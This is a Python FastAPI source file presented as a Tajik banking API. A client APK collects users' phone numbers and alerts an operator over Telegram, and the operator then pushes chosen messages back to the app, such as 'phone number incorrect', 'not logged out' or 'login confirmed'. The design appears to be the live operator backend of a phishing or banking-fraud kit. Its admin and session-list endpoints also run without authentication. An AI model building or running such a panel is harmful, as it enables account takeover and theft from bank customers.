import os
from datetime import datetime
from typing import List, Optional
from contextlib import asynccontextmanager
from fastapi import FastAPI, Depends, HTTPException, status
from fastapi.middleware.cors import CORSMiddleware
from sqlalchemy.orm import Session
from dotenv import load_dotenv

from database import init_db, get_db, UserSession, AdminLog
from models import (
    RegisterRequest,
    RegisterResponse,
    SessionStatusResponse,
    AdminCommandRequest,
    GenericResponse
)

load_dotenv()

# Global reference to telegram bot notifier
bot_notifier_callback = None


def set_bot_notifier(callback):
    global bot_notifier_callback
    bot_notifier_callback = callback


@asynccontextmanager
async def lifespan(app: FastAPI):
    # Initialize SQLite database tables
    init_db()
    yield


app = FastAPI(
    title="DC City Dushanbe Banking API",
    description="Backend API supporting client APK session registration and live Telegram admin interactions.",
    version="1.0.0",
    lifespan=lifespan
)

# CORS Middleware to support any client origin
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)


@app.get("/api/health", response_model=GenericResponse)
def health_check():
    return GenericResponse(
        status="ok",
        message="DC City Banking backend is healthy and running"
    )


@app.post("/api/register-session", response_model=RegisterResponse)
async def register_session(req: RegisterRequest, db: Session = Depends(get_db)):
    """
    Registers a new client session when user enters their phone number in APK.
    Strictly validates +992 and 9 digits.
    Notifies Telegram admin via Bot with inline action buttons.
    """
    existing = db.query(UserSession).filter(UserSession.session_id == req.session_id).first()
    now = datetime.utcnow()

    if existing:
        existing.phone = req.phone
        existing.language = req.language
        existing.status = "pending"
        existing.last_command = None
        existing.last_message = None
        existing.updated_at = now
    else:
        new_session = UserSession(
            session_id=req.session_id,
            phone=req.phone,
            language=req.language,
            status="pending",
            created_at=now,
            updated_at=now
        )
        db.add(new_session)

    db.commit()

    # Trigger Telegram Bot notification to Admin if available
    global bot_notifier_callback
    if bot_notifier_callback:
        try:
            await bot_notifier_callback(req.session_id, req.phone, req.language)
        except Exception as e:
            print(f"[Warning] Telegram notification failed: {e}")

    return RegisterResponse(
        status="success",
        message="Дархост бомуваффақият сабт шуд",
        session_id=req.session_id
    )


@app.get("/api/session/{session_id}/status", response_model=SessionStatusResponse)
def get_session_status(session_id: str, db: Session = Depends(get_db)):
    """
    Client APK polls this endpoint to receive live admin commands (/error1, /error2, /success).
    """
    session = db.query(UserSession).filter(UserSession.session_id == session_id).first()
    if not session:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail="Session not found"
        )

    return SessionStatusResponse(
        session_id=session.session_id,
        phone=session.phone,
        status=session.status,
        message=session.last_message,
        command=session.last_command,
        updated_at=session.updated_at.isoformat() if session.updated_at else None
    )


@app.post("/api/admin/command", response_model=GenericResponse)
def dispatch_admin_command(req: AdminCommandRequest, db: Session = Depends(get_db)):
    """
    Admin command dispatcher (from Telegram bot or Webhook).
    Supported commands:
      - error1: "Рақами телефон нодуруст аст. Лутфан рақамро санҷед"
      - error2: "Шумо ҳоло аз аккаунти худ баромад накардаед"
      - success: "Воридшавӣ тасдиқ шуд"
      - custom: custom message text
    """
    session = db.query(UserSession).filter(UserSession.session_id == req.session_id).first()
    if not session:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail="Session not found"
        )

    msg = req.message
    if not msg:
        if req.command == "error1":
            msg = "Рақами телефон нодуруст аст. Лутфан рақамро санҷед"
        elif req.command == "error2":
            msg = "Шумо ҳоло аз аккаунти худ баромад накардаед"
        elif req.command == "success":
            msg = "Воридшавӣ тасдиқ шуд"
        else:
            msg = "Паём аз маъмурият"

    session.status = req.command
    session.last_command = req.command
    session.last_message = msg
    session.updated_at = datetime.utcnow()

    # Log action
    log = AdminLog(
        session_id=req.session_id,
        command=req.command,
        message=msg,
        admin_id=req.admin_id
    )
    db.add(log)
    db.commit()

    return GenericResponse(
        status="success",
        message=f"Фармони {req.command} ба корбар фиристода шуд"
    )


@app.get("/api/sessions")
def list_sessions(db: Session = Depends(get_db)):
    """
    Lists recent sessions for the admin dashboard.
    """
    sessions = db.query(UserSession).order_by(UserSession.updated_at.desc()).limit(25).all()
    return [
        {
            "session_id": s.session_id,
            "phone": s.phone,
            "language": s.language,
            "status": s.status,
            "last_message": s.last_message,
            "updated_at": s.updated_at.isoformat() if s.updated_at else None
        }
        for s in sessions
    ]


if __name__ == "__main__":
    import uvicorn
    host = os.getenv("HOST", "0.0.0.0")
    port = int(os.getenv("PORT", 8000))
    uvicorn.run("main:app", host=host, port=port, reload=True)
